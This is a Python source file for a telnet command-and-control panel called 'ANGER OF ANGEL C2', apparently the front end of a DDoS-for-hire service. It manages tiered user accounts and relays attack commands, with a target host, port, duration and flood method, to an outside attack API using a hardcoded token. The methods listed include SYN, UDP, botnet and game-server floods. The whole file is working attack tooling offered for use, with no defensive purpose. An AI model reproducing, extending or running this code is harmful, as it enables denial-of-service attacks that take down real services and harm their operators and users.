#!/usr/bin/env python3
"""
ANGER OF ANGEL C2 - Telnet Command & Control
Management port: 8019
Attack port:     2092
"""

import socket
import threading
import json
import os
import time
import requests
import sys
import re
from datetime import datetime

API_TOKEN = "p0FRrBn17gdy2pDlTKEkB8"
ATTACK_URL = "https://api.l7srv.su/attack"
STOP_URL = "https://api.l7srv.su/stop"
USER_DB_FILE = "users.json"
MAX_CONCURRENT = 10
MANAGEMENT_PORT = 8019
ATTACK_PORT = 2092

BANNER = r"""
............................................:+:;;::...:.::;.:.:;;..:::::::....:...:..:...::::::..:::
....................................................................................................
....................................................................................................
....................................................................................................
..............................................:.....................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
;$x....::....;&+............+;;:::.$$..:&+.$$....:.............X&&:............x&&&+..........&&&&&$
$&&x...&&....:&x............;;&&++:&$..:&x.$&..$&X$&x.........x&x&x...&&x.:&;:$$:.+$x:x&XX$$;:$&..+&
&;x&+..$$....:&X..............&$...$&&$$&X.&&..$&$+:.........+&$X$&;..$&&$.&+X&;.X&&&.$&Xx++..$&$&&;
&&&&&;.&$.....&$;;;;.........:&X...X&..:&&.$&.+x.;X&X.......;&X.:;&X..&$:&&&+:&$:.:&&.&$::::..$&:.$&
;...XX:&$&&&;.xx++;:.........:&x...x$..:XX.$$.;&&$$&x.............:;..&$..&&x..x$$$x..&&&$$X..xX:..:
....................................................................................................
&&&&&&$&Xx+;+x+x++;;+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+;+;x;;;;;;++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
$$$$&&$X$Xx++++;;;;+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+;;x;X;xxxxX&&XXXx;;;;;;;;;;;;;;;;;;;;;;;;;;
xX$XX$XXXxXxXx;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+;;;;;;++++xXXX$&&&&&&&$$XxXx+x++;;;;;;;;;;;;;;;
XXXX$$$$$&$XXxx+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;x+x$$$$$$$X&$X&&&&&&&$&&&$Xxxxx+++x;;xx+;;
$$$$$$$$$$&&$xXx;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+x+;;+X$$$$$$XXXx++X$&&&&&&&&&&&&&$$$XX$Xx+xxxX
$$&&$&&&&&&&&&$x;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+;xX++;;;+x+xx+xx++;++;;+;xX+++;;+X$&X;+++;;;;;+;++x
&$$$$&$$$$$&$xx+;;;+XxX$$;;;+++;;;;;;;;;;;;;;;+;+++xXx;++;+;++++++;;;;+;+;;+;;;;;;;;;;;;;;;;;;;;;+++
$&$&$&&xXX$Xx++Xx+x&$&&&X&$$x+++x;;;;;;;;;;;;;;;;;;;+xx;;;;;;;+;++++++++xx++xX++xxx+xxx++x+;;;;;;;;;
&$+$xX$;x+xxXxX$&&&&&&&&&&$&$$x+x;;+;;;;;;++;;;;;;;;+;;;;;;;;;;;;+++++xxxXX$$$&&&&&&$$$XXxx++;;;;;;;
$$+X$X$+xXxXX&&&&&&&&&&&&&&&$Xxx+x++;;;+;+;;;;;;;;;;;;;;;+;;;;;;+XXxxxX$$&&&&&&&&&&&&&&&&&&$$+x+;;;;
$$Xx+Xx$+$$&&&&$$&&&&&&$&&$&$$$$XXX+;+;+;;;;;;;;;;;;;;;;;;;;;+++xXXXX$&&&&&&&&&&$$$xx$$&&&&&&&$Xx+++
xx;x$$$&&&&&&&&&&&&$&&&&$&&&$&$$$X$$XxxX++;;;;;;;;;;;;;;;;;++xXX$$$$$&&&&&$$X$$xXx++++;;;;+X&&&&$Xx+
X$$$&&&&&&&&&&&&&&&$&&&&&&&&&&&&&&&$$X$$$xx;;;;;;;;;;;;;;;+xxxxXX$$$X$&$X$$&&&&&&&&&&&&&&++XX+$&&&$x
&&&&&&$&&&&&&&&&&$$&&&&&&&&&&&&&$&&&&&&&&$X+;;;;;;;;;;;;;;;XxXXXX$X++XX$&$&$&&&&&&&&&&&&&&&&$$xX&&&&
&&&&&&&&&&&&$X&&&&&&&&&&&&&&&&&&&&&&&&&&&&$X+;;;;;;;;;;;;;;++xxXXx;;X$$$$&&&&&&&&&&&$;x&&$&&&&&$X&&&
&&&&&&$&&&&$xX$$&&&&&&&&&&&&&&&&&&&&&&&&&&&&X+;;;;;;;;;;;;;;;;+++;;x$$&&&&&&$&$$$&&&&$X$&$;+&&&&&xX&
&&&&&&&$xxXX$&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&$+;;;;;;;;;;;;;;;;;;;;x$$$&&&&$xX$&xXX$&$xXX$+;;;X&$$&&X
&&&&&$XXXXX$&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&$$x;;;;;;;;;;;;;;;;;;+X$&&&&&$XXxxX$X+xxxX$$+;;;;+x+xXXx
&$&$XX$$$$$&$&&$&&&&&&&&&&&&&&&&&&&&&&&&$$&&&$$+;;;;;;;;;;;;;;;;;;;;;$X$&$X+++;;+x+++;;;;+;;;;;;+x++
&&$XX$&$$x;;;;;;;;+X$&&&&&&&&&&&&&&&&&&&&&&&&&$x+;;;;;;;;;;;;;;;;;;+;xXXx+x$$XxXX$X++;+;;;;;;;;;;+;;
$$&$$&$x;;;;;;;x;;;;;;;;X&&$&&$$&&$$$$$$&&$&&&$$x+;;;;;;;;;;;;;;;;;++;;;x$$xXX$xXx+x;;+;;;;;;;;;;;;;
&&$&&$xx$+x$&&&$$XXx+;;;;x&&&&&&&&&$&&&$&&&&&$$&Xx;;;;;;;;;;;;;;;;;xXX$$$$XXXXXXxxx+;;;;;;;;;;;;;;;;
&&&&&&&&&&&&&&&&&&&&&&&$x;x&&&&&&&&&&&&&&&$&&&&&&X+;;;;;;;;;;;;;;;;;;+xxxX&&$$&Xxxxx+++;;;;;;;;;;;;;
&&&&&&&&&&&&&x+&&x;;+$&&&&&&&&$&&&&&$&&&$&$&&&&&&&X+;;;;;;;;;;;;;;;;+;;x+;++;+;++x+++;;;;;;;;;;;;;;;
&&&&&&&&$$&&&&$$$X;;;;+&&&&&&&&&&&&$&&&&&&&&&&&&&&$x+;;;;;;;;;;;;;;;;+x;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&$XX$$$XX$$;;;;+++X$&&&&&&&&&&&&&&&&&&&&&&&&&$X+;;;;;;;;;;;;;;;;;;;;;;+;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&&Xx;++XX+;+;;+;;;;+$&&&&&&&&&&&&&&&&&&&&&&&&&&X++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&&$x+XXXXx+;;;;;;++$&&&&&&&&&&&&&&&&&&&&&&&&&$Xx+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&$$X$$&$$&$&Xxxx++;;++xX&&&&&&&&&&&&&$&&&&&&&&&&$x++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&&&&$$&xxxx;;++xX$&&&&$&&&&&&&&&&&&&&&&&&&x;+;+++;+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
$&&&&&&&&&$$$$XXX$XXx+X&&&&&&&&&&&&&&&&&&&&&&&&X;;;;++++++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&$&&$&&&&&&$$$XxX$xx;x&&&&&&&&&&&&&&&&&&&&&&&$$;;;;;;+x;++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
$&&&&&&&&&&$$Xx+++++x$&&&&&&&&&&&&&&&&&&&&&&&&+;;;;;++x+++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&&$X&XXx+xx;;;X&&&&&&&&&&&&&&&&&&&&&&&&&x;;;;;+xXxx+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&&&$$XXxX+xx++;X&&&&&&&&&&&&&&&&&&&&&&&&&x;;;;;;xX$&$X+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&$$&&&$XXxXxx+++X&&&&&&&&&&&&&&&&$&&$&&&$&+;;;;;;;x$&&&$x+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&$&&&$$$XXxxxxxxX$&&&&&&&&&&&&&&&&&&&&$&&&+;;;;;;+X$&&&&&$x+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
&&&&&$&$X$$X$$XxX&&&&&&&$&&&$&&&&&&&&&&&&&+;;;;;;;X$&&&&&$&$X++;;;;;;++xxx;;;;;;;;;;;;;;;;;;;;;;;;;;
$&&&&&&$$$$X$X$$&&&&&&&&&&&&&&&&&&&&&&&&&$;;;;;;;$&&&&&&&&&&$X+xx+;;X&&&&&&x;;;;;;;;;;;;;;;;;;;;;;;;
:..::...............................................................................................
+..$$.;$&&$x.$&$&&&:.XX$$$+.....x&&&&&$..+XXx:......$$&&&$..;Xxxxx;.....;;.....+$&$X;.;+......x&&&&&
;.:&$.$&;:+x.X&+;;;..$&..;&$......;&X..:&&:.+&$.....&$..+&;.x&;:::.....:&$....$&;..x&x:&$..$&:;&x::;
:::&$..;X&&&:x&X+;;..$&...&&:.....;&X..x&:...$&:....X&$XX&$.X&&$$&:....:&&....$&...:&$.$&.+&+.:&$++;
&&&$:.&&;:X&;;&X+xxx.X&..;$$......;&X..;&X..:$&.....+&+;;&$:X&:........:&&....X&x::X&+.:&$&$...$$++x
.:....:;xx+:..;::::..x&&$X;.......:;;...:$$&&x......;x+;;:..$&&&&&x.....&&&&&&.:x$$+....X&&....;;:::
....:...............................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
..................................................;:................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
....................................................................................................
"""

FREE_METHODS = ["dns", "browser-free", "tls-free"]

ALL_METHODS = [
    "browser-free", "tls-free", "httpbypass", "slavaRussiaBypass",
    "http-meta", "browser", "http", "HTTP-RATELIMIT", "HTTP-CUSTOM",
    "http-raw", "http-loadbalance", "priv-flood", "priv-bypass", "priv-tor",
    "ultra-priv-flood", "ULTRA-BYPASS", "ultra", "tcp-raw", "ovh-raw",
    "udp-raw", "holder", "tcp-botnet", "udp-botnet", "ovh-botnet",
    "game", "roblox", "fivem", "tcp", "ovh", "syn", "ssh", "discord",
    "udp-vse", "dns"
]

DEFAULT_USERS = {
    "admin": {"password": "admin123", "role": "admin"},
    "vip1": {"password": "vip123", "role": "vip"},
    "guest1": {"password": "guest123", "role": "guest"}
}

active_attacks = {}

def load_users():
    if os.path.exists(USER_DB_FILE):
        with open(USER_DB_FILE, 'r') as f:
            return json.load(f)
    else:
        save_users(DEFAULT_USERS)
        return DEFAULT_USERS

def save_users(users):
    with open(USER_DB_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def authenticate(username, password):
    users = load_users()
    if username in users and users[username].get("password") == password:
        return users[username].get("role")
    return None

def add_user(username, password, role):
    users = load_users()
    if username in users:
        return False
    users[username] = {"password": password, "role": role}
    save_users(users)
    return True

def delete_user(username):
    users = load_users()
    if username not in users:
        return False
    if username == "admin":
        return False
    del users[username]
    save_users(users)
    return True

def get_user_role(username):
    users = load_users()
    return users.get(username, {}).get("role")

def list_users():
    users = load_users()
    return {u: info['role'] for u, info in users.items()}

class TelnetHandler(threading.Thread):
    def __init__(self, client_socket, address, server_type):
        threading.Thread.__init__(self)
        self.client = client_socket
        self.address = address
        self.server_type = server_type
        self.username = None
        self.role = None
        self.authenticated = False
        self.running = True

    def send(self, msg):
        try:
            self.client.send((msg + "\r\n").encode('utf-8'))
        except:
            pass

    def send_banner(self):
        self.send(BANNER)
        self.send("\r\n" + "="*60)
        self.send("         ANGER OF ANGEL C2")
        self.send("         Port: {}".format(self.client.getsockname()[1]))
        self.send("="*60 + "\r\n")

    def login(self, username, password):
        role = authenticate(username, password)
        if role:
            self.username = username
            self.role = role
            self.authenticated = True
            self.send("[+] Login successful. Role: {}".format(role))
            return True
        else:
            self.send("[-] Invalid credentials.")
            return False

    def handle_management(self, cmd):
        if cmd.startswith("adduser "):
            if self.role != "admin":
                self.send("[-] Admin only.")
                return
            parts = cmd.split()
            if len(parts) < 4:
                self.send("[-] Usage: adduser <username> <password> <role>")
                return
            _, uname, pwd, role = parts[0], parts[1], parts[2], parts[3]
            if role not in ["admin", "vip", "guest"]:
                self.send("[-] Role must be admin/vip/guest")
                return
            if add_user(uname, pwd, role):
                self.send("[+] User {} added with role {}.".format(uname, role))
            else:
                self.send("[-] User already exists.")
        elif cmd.startswith("deluser "):
            if self.role != "admin":
                self.send("[-] Admin only.")
                return
            parts = cmd.split()
            if len(parts) < 2:
                self.send("[-] Usage: deluser <username>")
                return
            uname = parts[1]
            if delete_user(uname):
                self.send("[+] User {} deleted.".format(uname))
            else:
                self.send("[-] Cannot delete user (maybe admin?).")
        elif cmd == "users":
            if self.role != "admin":
                self.send("[-] Admin only.")
                return
            users = list_users()
            self.send("Users:")
            for u, r in users.items():
                self.send("  {} - {}".format(u, r))
        elif cmd == "whoami":
            self.send("Username: {}, Role: {}".format(self.username, self.role))
        elif cmd == "logout":
            self.authenticated = False
            self.username = None
            self.role = None
            self.send("[+] Logged out.")
        elif cmd == "help":
            self.send("Commands (management):")
            self.send("  whoami")
            self.send("  logout")
            if self.role == "admin":
                self.send("  adduser <username> <password> <role>")
                self.send("  deluser <username>")
                self.send("  users")
        else:
            self.send("[-] Unknown command. Type 'help'.")

    def handle_attack(self, cmd):
        if cmd.startswith("attack "):
            parts = cmd.split()
            if len(parts) < 6:
                self.send("[-] Usage: attack <host> <port> <time> <method> <concs>")
                return
            _, host, port, time_sec, method, concs = parts
            try:
                port = int(port)
                time_sec = int(time_sec)
                concs = int(concs)
                if concs > MAX_CONCURRENT:
                    self.send("[-] Concurrent cannot exceed {}.".format(MAX_CONCURRENT))
                    return
                if time_sec < 1 or time_sec > 3600:
                    self.send("[-] Time must be between 1 and 3600 seconds.")
                    return
            except ValueError:
                self.send("[-] Port, time, and concs must be numbers.")
                return
            if self.role == "guest" and method not in FREE_METHODS:
                self.send("[-] Guest can only use free methods: {}".format(", ".join(FREE_METHODS)))
                return
            if method not in ALL_METHODS:
                self.send("[-] Unknown method. Available: {}".format(", ".join(ALL_METHODS[:10]) + "..."))
                return
            self.send("[*] Launching attack...")
            params = {
                "token": API_TOKEN,
                "host": host,
                "port": port,
                "time": time_sec,
                "method": method,
                "concs": concs
            }
            try:
                resp = requests.get(ATTACK_URL, params=params, timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    attack_id = data.get("attack_id")
                    if attack_id:
                        self.send("[+] Attack launched. ID: {}".format(attack_id))
                        active_attacks[attack_id] = {
                            "user": self.username,
                            "host": host,
                            "port": port,
                            "start": time.time()
                        }
                    else:
                        self.send("[-] Attack response missing attack_id: {}".format(data))
                else:
                    self.send("[-] API error: {}".format(resp.status_code))
            except Exception as e:
                self.send("[-] Error: {}".format(str(e)))
        elif cmd.startswith("stop "):
            parts = cmd.split()
            if len(parts) < 2:
                self.send("[-] Usage: stop <attackId>")
                return
            attack_id = parts[1]
            if self.role != "admin" and active_attacks.get(attack_id, {}).get("user") != self.username:
                self.send("[-] You can only stop your own attacks.")
                return
            if attack_id not in active_attacks:
                self.send("[-] Attack ID not found or already stopped.")
                return
            params = {"token": API_TOKEN, "attackId": attack_id}
            try:
                resp = requests.get(STOP_URL, params=params, timeout=10)
                if resp.status_code == 200:
                    self.send("[+] Attack {} stopped.".format(attack_id))
                    del active_attacks[attack_id]
                else:
                    self.send("[-] Stop failed: {}".format(resp.status_code))
            except Exception as e:
                self.send("[-] Error: {}".format(str(e)))
        elif cmd == "status":
            if active_attacks:
                self.send("Active attacks:")
                for aid, info in active_attacks.items():
                    self.send("  {} - {}:{} ({})".format(aid, info['host'], info['port'], info['user']))
            else:
                self.send("No active attacks.")
        elif cmd == "help":
            self.send("Commands (attack):")
            self.send("  attack <host> <port> <time> <method> <concs>")
            self.send("  stop <attackId>")
            self.send("  status")
            self.send("  logout")
        elif cmd == "whoami":
            self.send("Username: {}, Role: {}".format(self.username, self.role))
        elif cmd == "logout":
            self.authenticated = False
            self.username = None
            self.role = None
            self.send("[+] Logged out.")
        else:
            self.send("[-] Unknown command. Type 'help'.")

    def run(self):
        self.send_banner()
        self.send("Welcome to ANGER OF ANGEL C2.")
        self.send("Please log in.")
        while self.running:
            try:
                data = self.client.recv(1024).decode('utf-8', errors='ignore').strip()
                if not data:
                    break
                if not self.authenticated:
                    if data.lower().startswith("login "):
                        parts = data.split()
                        if len(parts) != 3:
                            self.send("[-] Usage: login <username> <password>")
                            continue
                        _, user, pwd = parts
                        if self.login(user, pwd):
                            self.send("[+] You are now logged in. Use 'help' for commands.")
                        continue
                    else:
                        self.send("[-] Please login first: login <username> <password>")
                        continue
                else:
                    if self.server_type == 'management':
                        self.handle_management(data)
                    else:
                        self.handle_attack(data)
            except Exception as e:
                self.send("[-] Error: {}".format(e))
                break
        self.client.close()

def start_server(port, server_type):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print("[*] {} server listening on port {}".format(server_type.capitalize(), port))
    while True:
        client, addr = server.accept()
        print("[+] Connection from {} on {} port".format(addr, port))
        handler = TelnetHandler(client, addr, server_type)
        handler.start()

if __name__ == "__main__":
    load_users()
    print(BANNER)
    print("ANGER OF ANGEL C2 starting...")
    print("Management port: {}".format(MANAGEMENT_PORT))
    print("Attack port:     {}".format(ATTACK_PORT))
    t1 = threading.Thread(target=start_server, args=(MANAGEMENT_PORT, 'management'), daemon=True)
    t2 = threading.Thread(target=start_server, args=(ATTACK_PORT, 'attack'), daemon=True)
    t1.start()
    t2.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0)